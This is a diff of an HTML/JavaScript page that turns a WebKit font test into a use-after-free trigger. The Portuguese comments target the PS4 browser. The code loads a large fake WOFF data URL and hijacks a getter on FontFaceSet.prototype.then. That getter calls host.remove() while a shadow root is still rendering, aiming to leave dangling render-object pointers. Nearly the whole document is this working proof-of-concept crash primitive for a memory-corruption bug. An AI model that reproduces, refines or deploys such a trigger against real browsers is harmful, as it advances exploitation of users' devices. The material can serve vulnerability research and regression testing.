@@ -1,82 +1,82 @@
-
 <!DOCTYPE html>
 <html>
-<head>
-<meta charset="utf-8">
-<title>WebKit Ahem Font Test</title>
-</head>
+<head><meta charset="utf-8"></head>
 <body>
-<h2>Teste com fonte real (Ahem.woff)</h2>
 <pre id="log"></pre>
 <script>
-function log(message)
-{
-    document.getElementById('log').textContent += message + '\n';
-    console.log(message);
-}
+// UAF via host.remove() durante rendering de shadow root
+//
+// Mecanismo confirmado:
+//   100KB data URL → opportunisticallyStartFontDataURLLoading (PS4 sincrono)
+//   → font carrega durante glyph walk do rendering
+//   → FontFace.loaded → FontFaceSet.prototype.then → getter dispara
+//   → DURANTE o rendering ativo do shadow root
+//
+// Se host.remove() durante rendering causa UAF:
+//   O renderer ainda tem ponteiros para o shadow root / RenderObject
+//   host.remove() → desanexa o node e invalida os render objects
+//   Rendering continua com objetos potencialmente liberados → UAF
 
-log("Iniciando teste com Ahem.woff...");
+function log(s) { document.getElementById('log').textContent += s + '\n'; }
 
-// Touch document.fonts
 document.fonts;
 
-const host = document.createElement("div");
-document.body.appendChild(host);
-const shadowRoot = host.attachShadow({ mode: "open" });
+// 100KB — confirmado que dispara getter durante rendering no PS4
+var pendingUrl = 'url("data:font/woff;base64,' + 'A'.repeat(100000) + '")';
 
-const fontFaceStyle = document.createElement("style");
-fontFaceStyle.textContent = `@font-face { font-family: reentryFont; src: url("resources/Ahem.woff"); }`
-    + `.probe { font: 24px reentryFont; }`;
-shadowRoot.appendChild(fontFaceStyle);
+function run() {
+    var host = document.createElement('div');
+    document.body.appendChild(host);
+    var shadowRoot = host.attachShadow({ mode: 'open' });
 
-const probe = document.createElement("span");
-probe.className = "probe";
-probe.textContent = "A";
-shadowRoot.appendChild(probe);
+    var fontFaceStyle = document.createElement('style');
+    fontFaceStyle.textContent =
+        '@font-face { font-family: reentryFont; src: ' + pendingUrl + '; }' +
+        '.probe { font: 24px reentryFont; }';
+    shadowRoot.appendChild(fontFaceStyle);
 
-// Força layout inicial
-document.body.offsetHeight;
-document.fonts.load("24px reentryFont", "A");
-log("document.fonts.status: " + document.fonts.status);
+    var probe = document.createElement('span');
+    probe.className = 'probe';
+    probe.textContent = 'A';
+    shadowRoot.appendChild(probe);
 
-// Materializa ready
-document.fonts.ready;
+    void document.body.offsetHeight;
+    log('status: ' + document.fonts.status);
+    document.fonts.load('24px reentryFont', 'A');
+    void document.fonts.ready;
 
-// Prepend para criar pendência UpdateType::ActiveSet
-const prependedStyle = document.createElement("style");
-prependedStyle.textContent = ".unused { color: red; }";
-shadowRoot.prepend(prependedStyle);
-log('após prepend. status=' + document.fonts.status);
+    var prependedStyle = document.createElement('style');
+    prependedStyle.textContent = '.x { color: blue; }';
+    shadowRoot.prepend(prependedStyle);
 
-let getterCallCount = 0;
-Object.defineProperty(FontFaceSet.prototype, "then", {
-    configurable: true,
-    get() {
-        delete FontFaceSet.prototype.then;
-        ++getterCallCount;
-        log('>>> GETTER DISPAROU! count=' + getterCallCount);
-        log('    status no momento: ' + document.fonts.status);
-        try {
+    var getterCount = 0;
+    Object.defineProperty(FontFaceSet.prototype, 'then', {
+        configurable: true,
+        get: function() {
+            delete FontFaceSet.prototype.then;
+            getterCount++;
+            log('[GETTER] disparou durante rendering — chamando host.remove()');
+            // Remover o host enquanto o renderer esta processando o shadow root
+            // O glyph walk ainda esta ativo na call stack C++
+            // RenderObject do shadow root pode estar com dangling pointer
             host.remove();
-            log('    host.remove() executado com sucesso.');
-        } catch(e) {
-            log('    erro no host.remove(): ' + e);
+            return undefined;
         }
-        return undefined;
-    }
-});
+    });
 
-log('Aplicando gatilho de estilo...');
+    log('getter instalado — aguardando rendering...');
 
-try {
-    document.styleSheets.length;
-    const computed = window.getComputedStyle(probe).fontFamily;
-    log('Estilo computado: ' + computed);
-} catch (err) {
-    log('Erro: ' + err);
+    setTimeout(function() {
+        log('getter count: ' + getterCount);
+        if (getterCount === 0)
+            log('getter nao disparou');
+        log('PASS se chegou aqui sem crash');
+    }, 500);
 }
 
-log("Fim do script principal. getterCallCount = " + getterCallCount);
+window.addEventListener('load', function() {
+    setTimeout(run, 0);
+});
 </script>
 </body>
 </html>
